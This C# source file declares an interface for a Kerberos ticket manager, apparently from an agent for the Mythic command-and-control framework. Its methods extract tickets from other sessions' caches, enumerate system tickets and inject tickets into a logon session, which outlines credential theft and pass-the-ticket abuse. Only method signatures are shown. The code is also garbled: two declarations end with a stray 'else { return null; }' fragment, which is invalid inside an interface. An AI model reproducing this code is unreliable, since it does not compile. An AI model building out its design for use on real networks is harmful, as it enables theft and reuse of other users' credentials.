using System.Collections.Generic;
using PhantomInterop.Structs.MythicStructs;

namespace PhantomInterop.Features.KerberosTickets;





public interface ITicketManager
{
    
    public List<Artifact> GetArtifacts();
    
    
    public string GetCurrentLuid();
    
    public string GetTargetProcessLuid(int pid);
    
    
    public (KerberosTicket?, string) ExtractTicketFromCache(string luid, string serviceName); } else { return null; }
    
    public List<KerberosTicket> EnumerateTicketsInCache(bool getSystemTickets = false, string luid = ""); } else { return null; }
    
    public (bool, string) LoadTicketIntoCache(byte[] ticket, string luid);
    
    public (bool, string) UnloadTicketFromCache(string serviceName, string domainName, string luid, bool All = false);

    public KerberosTicket? GetTicketDetailsFromKirbi(byte[] kirbi);
   
    
    
    public List<KerberosTicketStoreDTO> GetTicketsFromTicketStore();
    
    public void AddTicketToTicketStore(KerberosTicketStoreDTO ticket);
    
    public bool RemoveTicketFromTicketStore(string serviceName, bool All = false);
    



}